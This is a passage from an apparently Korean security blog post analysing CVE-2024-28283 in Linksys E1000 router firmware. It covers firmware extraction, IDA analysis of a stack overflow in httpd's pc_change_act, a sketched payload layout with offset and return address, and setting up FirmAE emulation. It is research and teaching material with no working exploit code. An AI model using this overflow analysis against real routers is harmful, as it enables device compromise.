&lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
Extractor.execute failed to run external extractor &apos;sasquatch -p 1 -le -d &apos;%%squashfs-root%%&apos; &apos;%e&apos;&apos;: [Errno 2] No such file or directory

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;찾아보니, squashfs 파일시스템과 관련해서만 해당 에러가 생기는 것으로 추정되며, sasquatch 모듈을 따로 설치해 해결할 수 있다고 한다. (https://github.com/threadexio/sasquatch.git)&lt;/p&gt;

&lt;p&gt;설치해서 추출해 보니, 아래와 같이 문제없이 완료되었다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image%208.png&quot; alt=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;추출된 .extracted 디렉토리를, 위의 config에 나온 내용(&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/firmware/NETGEAR/analyzed/R6200v2-V1.0.3.12_10.1.11/fw/&lt;/code&gt;)을 참고하여 이동해 두었다.&lt;/p&gt;

&lt;p&gt;위의 이동을 반영한 config 파일은 아래와 같이 생성했다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;bin&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[],&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;pickle_parsers&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;./pickles/parser/Linksys/Linksys/analyzed/E1000/fw/_FW_E1000_2.1.03.005_US_20140321.bin.extracted/squashfs-root.pk&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;stats&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;False&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;data_keys&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[],&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;base_addr&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;eg_source_addr&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;fw_path&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;./firmware/Linksys/analyzed/E1000/fw/_FW_E1000_2.1.03.005_US_20140321.bin.extracted/squashfs-root&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;angr_explode_bins&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;openvpn&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;wpa_supplicant&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;vpn&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;dns&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ip&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;log&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;qemu-arm-static&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;var_ord&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;glob_var&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[],&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;arch&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;only_string&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;False&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;그리고 아래와 같이 KARONTE를 run 했다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image%209.png&quot; alt=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;그러나 Border Binaries Discovery 단계에서 더 이상 넘어가지 못했다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image%2010.png&quot; alt=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;네트워크와 상호작용하는 바이너리를 BBD에서 찾아낸다고 했는데…. 무슨 문제인지 모르겠다.&lt;/p&gt;

&lt;p&gt;올바르게 config을 해야 하나 싶은데, 어떻게 해야 할지 더 고민해 봐야 할 것 같다.&lt;/p&gt;

&lt;p&gt;만약 퍼징으로 찾지 못한 취약점이라면, reporter는 어떤 경로로 이 취약점을 찾았을까?&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;11-정적-분석&quot;&gt;1.1. 정적 분석&lt;/h2&gt;

&lt;h3 id=&quot;110-분석-대상-파일-찾기&quot;&gt;1.1.0. 분석 대상 파일 찾기&lt;/h3&gt;

&lt;p&gt;일단 취약점이 발생한 파일인 httpd 파일을 찾아야 한다.&lt;/p&gt;

&lt;p&gt;httpd면 apache 웹서버인가? 보통 이건 /etc/httpd 디렉토리 형태로 떨어지는데.&lt;/p&gt;

&lt;p&gt;바이너리 형태로 떨어진 거면 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin&lt;/code&gt; , &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/sbin&lt;/code&gt; ,  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/bin&lt;/code&gt; ,  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/sbin&lt;/code&gt; 중 하나에는 있겠다 생각했다.&lt;/p&gt;

&lt;p&gt;그렇게 생각하고 찾아보니, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/sbin/&lt;/code&gt;에서 찾을 수 있었다.&lt;/p&gt;

&lt;p&gt;이렇게 휴리스틱한 방식 말고 다른 방법으로도 찾을 수 있다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;구글링
    &lt;ul&gt;
      &lt;li&gt;
        &lt;p&gt;httpd firmware를 검색하면 아래와 같이 펌웨어상의 httpd 바이너리에서 발생한 CVE 분석 글이 있다.&lt;/p&gt;

        &lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image%2011.png&quot; alt=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;해당 CVE는 netgear 라우터에서 발생한 취약점이다. 지금 분석 대상 펌웨어 또한 라우터 펌웨어인 점을 고려했을 때, 비슷한 OS 및 시스템 구조를 차용하고 있을 가능성이 높으므로 그대로 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/sbin&lt;/code&gt;을 찾아보면 httpd 파일을 찾을 수 있었을 것이다.&lt;/p&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;everything
    &lt;ol&gt;
      &lt;li&gt;제일 쉽긴 한데 한 10분 기다려야 한다.&lt;/li&gt;
      &lt;li&gt;everything 유틸리티가 추출한 펌웨어 파일시스템에 대해 분석을 해야 하기 때문에…&lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;그래도 검색하면 이렇게 httpd를 찾을 수 있다.&lt;/p&gt;

        &lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image%2012.png&quot; alt=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;
      &lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;111-분석&quot;&gt;1.1.1. 분석&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;pc_change_act&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;IDA에 넣고 띄운 다음 function 이름(&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pc_change_act&lt;/code&gt;)으로 검색했다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image%2013.png&quot; alt=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;문제의 조건과 완전히 일치하는 함수임을 알 수 있었다.&lt;/p&gt;

&lt;p&gt;이쪽에서 보이는 문자열들은 보통 라우터를 관리 및 설정할 때 보내는 설정키밸류의 키값인 것으로 보인다.&lt;/p&gt;

&lt;p&gt;왜냐하면 라우터 펌웨어라는 점을 고려했을 때 WTP는 Wireless Transcation Protocol의 약자인 것 같고, 보통 이런 형식의 문자열이면 라우터 관리변경 시에 사용하는 환경변수 값이고,&lt;/p&gt;

&lt;p&gt;위의 생각에 근거해 linksys pc_enable로 검색해 보니, 아래와 같이 nvram info의 키값 중 하나인 점이 확인되었기 때문이다.(스크롤이 너무 길어 PC_enable은 안 보임)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image%2014.png&quot; alt=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;그럼 이제 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pc_change_act&lt;/code&gt; 함수를 들여다 보자.&lt;/p&gt;

&lt;p&gt;문제에서는 힌트로 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;get_cgi&lt;/code&gt;를 언급했는데, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;get_cgi&lt;/code&gt;의 xref를 보면 매우 많은 점을 알 수 있다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image%2015.png&quot; alt=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;이런 상황에서 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;get_cgi&lt;/code&gt;를 루트커즈로 판단하는 것은 논리적으로 틀린 추측이 된다.&lt;/p&gt;

&lt;p&gt;그보다는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;get_cgi&lt;/code&gt;의 값을 내부적으로 처리하는 과정에서 문제가 생겼다고 보는 것이 맞고, 따라서 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pc_change_act&lt;/code&gt; 함수에 루트커즈가 있다고 판단하는 것이 맞다고 생각한다.&lt;/p&gt;

&lt;p&gt;이제 상세하게 내부 데이터 처리 루틴을 파악해 보자.&lt;/p&gt;

&lt;p&gt;먼저 해당 함수의 내부에서는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sscanf&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sprintf&lt;/code&gt;를 사용하고 있는 것이 보인다.&lt;/p&gt;

&lt;p&gt;그러나 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sscanf&lt;/code&gt;를 보면 펌웨어가 작동 중인 정보시스템 외부의 값이 활용될 여지가 낮아 보인다. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nvram_get&lt;/code&gt; 함수는 “TMSSS_enable” nvram 엔트리에서 value를 가져오는데, 비록 이게 user controlled data이지만 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sscanf&lt;/code&gt;에서 %d로 핸들링하기 때문에 RCE로 이어질 가능성이 낮기 때문이다.&lt;/p&gt;

&lt;p&gt;따라서 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sprintf&lt;/code&gt;에 집중했다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image%2016.png&quot; alt=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;v5는 24byte 크기 배열인데, 설정 파라미터 키값을 데이터 처리 파라미터로 썼기 때문에 user controlled data인 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PC_enable&lt;/code&gt;의 value를 리턴할 가능성이 높은 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;get_cgi(”PC_enable”)&lt;/code&gt;의 값을 그대로 복사해 받는다.&lt;/p&gt;

&lt;p&gt;BOF가 의심되는 정황이다.&lt;/p&gt;

&lt;p&gt;따라서 함수를 타고 들어가며 추측이 맞는지 더 정확히 알아보았다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;get_cgi&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image%2017.png&quot; alt=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;get_cgi&lt;/code&gt; 내부에서 0이 아닌 다른 값을 리턴하려면 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;get_xss&lt;/code&gt;가 콜되어야 한다.&lt;/p&gt;

&lt;p&gt;눈치상 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hsearch_r&lt;/code&gt;에서 v3과 a1을 근거로 검색을 수행해서, 별 문제 없으면 v4가 a1(“PC_enable”의 시작주소)를 가리킬 것 같다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;get_xss&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image%2018.png&quot; alt=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;보안 조치인 것 같다. XSS 유발하는 code signature가 있는지 판단하는 것으로 보이는데,&lt;/p&gt;

&lt;p&gt;리턴값이 유의미한 값이 되기 위해서는 if 문이 false가 되고 v2가 리턴되는 플로우가 진행되어야 한다. 즉, XSS 문제가 없는 입력값이어야 한다.&lt;/p&gt;

&lt;p&gt;그렇다면 뭐가 v2에 값을 할당하는가? if 문의 가장 마지막 조건이다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strchr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;62&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
&lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strstr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;&amp;amp;nbsp;&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;위 조건에 대한 검사를 거치고 나면 v2에는 a1이 저장된다.&lt;/p&gt;

&lt;p&gt;즉, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;get_cgi&lt;/code&gt;에 인수로 준 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PC_enable&lt;/code&gt;의 시작주소가 그대로 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pc_change_act&lt;/code&gt;의 변수 cgi에 들어간다.&lt;/p&gt;

&lt;p&gt;해당 바이너리(httpd)는 gcc-compiled c/c++ 바이너리다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image%2019.png&quot; alt=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;img src=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image%2020.png&quot; alt=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image%2021.png&quot; alt=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;img src=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image%2022.png&quot; alt=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;위와 같이 IDA에서 확인된 정보와 컴파일러의 convention 등을 고려했을 때,&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;30byte+RET addr+shellcode&lt;/code&gt; 로 주면 익스플로잇이 될 것처럼 보인다. 물론 RCE를 하고 싶으면 NX-bit 등이 걸려있는지 확인해야 하지만&lt;/p&gt;

&lt;p&gt;PoC는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;30byte+RET addr taint(4byte)&lt;/code&gt;까지만 하면 될 것 같다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;물론 정적으로 알아낼 수 있는 데에는 한계가 있다. 따라서 위 섹션에서 서술했던 추측을 확실하게 하려면, 동적으로 분석해야 한다.&lt;/p&gt;

&lt;p&gt;별다른 dynamic analysis prevention이 안 걸려 있는 것으로 보이기 때문에, 저 위치에 bp를 걸고 실행한 다음 데이터가 오가는 부분을 본다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;사족이지만, nvram_get 함수 자체에서 취약점이 발생할 여지가 높아 보여 개인적으로 검색해 봤는데, 발생한 이력이 있었다. 추가로, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apply.cgi&lt;/code&gt; url 또한 아래 취약점에서도 취약했던 url이었다.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;CVE-2018-3953&lt;/p&gt;

  &lt;p&gt;Devices in the Linksys ESeries line of routers (Linksys E1200 Firmware Version 2.0.09 and Linksys E2500 Firmware Version 3.0.04) are susceptible to OS command injection vulnerabilities due to improper filtering of data passed to and retrieved from NVRAM. Data entered into the ‘Router Name’ input field through the web portal is submitted to apply.cgi as the value to the ‘machine_name’ POST parameter. When the ‘preinit’ binary receives the SIGHUP signal, it enters a code path that continues until it reaches offset 0x0042B5C4 in the ‘start_lltd’ function. &lt;strong&gt;Within the ‘start_lltd’ function, a ‘nvram_get’ call is used to obtain the value of the user-controlled ‘machine_name’ NVRAM entry. This value is then entered directly into a command intended to write the host name to a file and subsequently executed.&lt;/strong&gt;&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;KARONTE를 돌려도 httpd는 border binary 로 치지 않아 분석 대상으로 보지 않았다. 즉, KARONTE로는 문제 취약점을 찾아낼 수 없었다.&lt;/p&gt;

&lt;p&gt;따라서 문제 취약점이 어떤 경로로 발견됐는지 고민하고 있었는데, Linksys 라우터 E 시리즈에서 발생했던 취약점 이력을 모두 모은 다음 해볼 만한 곳을 공략하는 정석적인 방식을 쓴 것 같았다.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;12-익스플로잇-환경-셋업&quot;&gt;1.2. 익스플로잇 환경 셋업&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/pr0v3rbs/FirmAE&quot;&gt;https://github.com/pr0v3rbs/FirmAE&lt;/a&gt; 에서 Firmware Emulator를 다운받아 직접 펌웨어를 구동하고, pc_change_act 를 참조하는 기능에 직접 페이로드를 보내 보는 것을 목적으로 한다.&lt;/p&gt;

&lt;p&gt;에뮬레이터 다운로드 후 레포에 나온 대로 설정을 끝내고, 아래 명령어를 실행했다.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$ sudo ./run.sh -c linksys ./firmwares/FW_E1000_2.1.03.005_US_20140321.bin&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image%2023.png&quot; alt=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;그 결과, 192.168.1.1에 펌웨어상의 웹서버가 구동된 것을 확인할 수 있었다.&lt;/p&gt;

&lt;p&gt;이제 디버깅을 위해 아래 명령어를 실행했다.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$ sudo ./run.sh -d linksys ./firmwares/FW_E1000_2.1.03.005_US_20140321.bin&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image%2024.png&quot; alt=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;정상 구동되었음을 확인할 수 있었다.&lt;/p&gt;

&lt;p&gt;이제 run gdbserver 옵션을 선택해 target pid에 httpd의 pid를 입력했다.&lt;/p&gt;

